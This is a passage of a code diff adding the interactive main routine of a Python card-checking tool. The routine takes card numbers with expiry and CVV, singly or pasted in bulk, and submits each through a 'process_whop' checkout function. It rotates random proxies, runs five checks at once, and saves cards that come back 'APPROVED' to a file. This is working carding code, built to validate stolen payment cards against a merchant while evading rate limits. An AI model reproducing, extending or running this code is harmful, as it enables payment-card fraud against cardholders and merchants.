+                proxy = input(f"{Colors.CYAN}Proxy URL{Colors.RESET}: ").strip()
+            else:
+                proxy = random.choice(proxies)
+                print(f"{Colors.GREEN}[✓]{Colors.RESET} Using: {proxy[:50]}...")
+        else:
+            print(f"{Colors.YELLOW}[!]{Colors.RESET} No proxies in {PROXY_FILE}, skipping")
+    else:
+        print(f"{Colors.YELLOW}[!]{Colors.RESET} No proxy")
+
+    # ─── MODE
+    print(f"\n{Colors.CYAN}{'━' * 20}{Colors.RESET}")
+    print(f"{Colors.BOLD}  1 — Single card{Colors.RESET}")
+    print(f"{Colors.BOLD}  2 — Bulk check{Colors.RESET}")
+    print(f"{Colors.CYAN}{'━' * 20}{Colors.RESET}")
+    mode = input(f"{Colors.CYAN}Mode{Colors.RESET}: ").strip()
+
+    if mode == "1":
+        raw = input(f"{Colors.CYAN}Card (no|mm|yy|cvv){Colors.RESET}: ").strip()
+        parsed = _parse_card(raw)
+        if not parsed:
+            print(f"{Colors.RED}[✗]{Colors.RESET} Invalid format")
+            return
+        cc, mes, ano, cvv = parsed
+
+        progress = ProgressLogger(enabled=True)
+        progress.start()
+
+        result = await process_whop(url, cc, mes, ano, cvv, proxy=proxy, progress=progress)
+
+        progress.finish()
+
+        status, message = _extract_result(result)
+        label = f"{cc}|{mes}|{ano}|{cvv}"
+
+        print(f"\n{Colors.CYAN}{'━' * 50}{Colors.RESET}")
+        print(f"{Colors.BOLD}RESULT{Colors.RESET}")
+        print(f"{Colors.CYAN}{'━' * 50}{Colors.RESET}")
+
+        if status == "APPROVED":
+            print(f"{Colors.GREEN}[✓]{Colors.RESET} {label} → {status}")
+            with open(APPROVED_FILE, "a") as f:
+                f.write(f"[{datetime.now()}] {label} | {status} | {message}\n")
+        elif status in ["CVV_MISMATCH", "3DS_REQUIRED", "INSUFFICIENT_FUNDS", "EXPIRED_CARD", "RATE_LIMIT"]:
+            print(f"{Colors.YELLOW}[!]{Colors.RESET} {label} → {status}")
+            with open(DECLINED_FILE, "a") as f:
+                f.write(f"[{datetime.now()}] {label} | {status} | {message}\n")
+        else:
+            print(f"{Colors.RED}[✗]{Colors.RESET} {label} → {status} - {message}")
+            with open(UNKNOWN_FILE, "a") as f:
+                f.write(f"[{datetime.now()}] {label} | {status} | {message}\n")
+
+    elif mode == "2":
+        print(f"\n{Colors.YELLOW}Paste cards below (card_no|mm|yy|cvv), one per line.{Colors.RESET}")
+        print(f"{Colors.YELLOW}Press Enter twice to start checking.{Colors.RESET}\n")
+
+        lines = []
+        while True:
+            line = input()
+            if line.strip() == "":
+                break
+            lines.append(line.strip())
+
+        cards = []
+        for ln in lines:
+            p = _parse_card(ln)
+            if p:
+                cards.append((ln, p))
+            else:
+                print(f"  {Colors.RED}[skip]{Colors.RESET} bad format: {ln}")
+
+        if not cards:
+            print(f"{Colors.RED}[✗]{Colors.RESET} No valid cards found.")
+            return
+
+        total = len(cards)
+        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Checking {total} card(s) — concurrency 5\n")
+
+        sem = asyncio.Semaphore(5)
+        stats = {"approved": 0, "declined": 0, "error": 0}
+
+        async def _check(idx: int, raw_line: str, parsed):
+            cc, mes, ano, cvv = parsed
+            async with sem:
+                px = proxy
+                if proxy_choice == "y" and mode != "2":
+                    pass
+                if proxy_choice == "y" and _load_all_proxies():
+                    px = random.choice(_load_all_proxies())
+                result = await process_whop(url, cc, mes, ano, cvv, proxy=px, progress=None)
+            status, message = _extract_result(result)
+            label = f"{cc}|{mes}|{ano}|{cvv}"
+
+            if status == "APPROVED":
+                stats["approved"] += 1
+                print(f"{Colors.GREEN}[✓]{Colors.RESET} {label} → {status}")
+                with open(APPROVED_FILE, "a") as f:
+                    f.write(f"[{datetime.now()}] {label} | {status} | {message}\n")
+            elif status in ["CVV_MISMATCH", "3DS_REQUIRED", "INSUFFICIENT_FUNDS", "EXPIRED_CARD", "RATE_LIMIT"]:
+                stats["declined"] += 1
+                print(f"{Colors.YELLOW}[!]{Colors.RESET} {label} → {status}")
+                with open(DECLINED_FILE, "a") as f:
+                    f.write(f"[{datetime.now()}] {label} | {status} | {message}\n")
+            else:
+                stats["error"] += 1
+                print(f"{Colors.RED}[✗]{Colors.RESET} {label} → {status} - {message}")
+                with open(UNKNOWN_FILE, "a") as f:
+                    f.write(f"[{datetime.now()}] {label} | {status} | {message}\n")
+
+        await asyncio.gather(*[_check(i, raw_line, parsed) for i, (raw_line, parsed) in enumerate(cards)])
+
+        print(f"\n{Colors.CYAN}{'━' * 50}{Colors.RESET}")
+        print(f"{Colors.BOLD}STATISTICS{Colors.RESET}")
+        print(f"{Colors.CYAN}{'━' * 50}{Colors.RESET}")
+        print(f"Total: {total}")
+        print(f"{Colors.GREEN}Approved: {stats['approved']}{Colors.RESET}")
+        print(f"{Colors.YELLOW}Declined: {stats['declined']}{Colors.RESET}")
+        print(f"{Colors.RED}Errors: {stats['error']}{Colors.RESET}")
+        print(f"{Colors.CYAN}{'━' * 50}{Colors.RESET}")
+
+    else:
+        print(f"{Colors.RED}[✗]{Colors.RESET} Invalid mode.")
+
+if __name__ == "__main__":
+    asyncio.run(main())
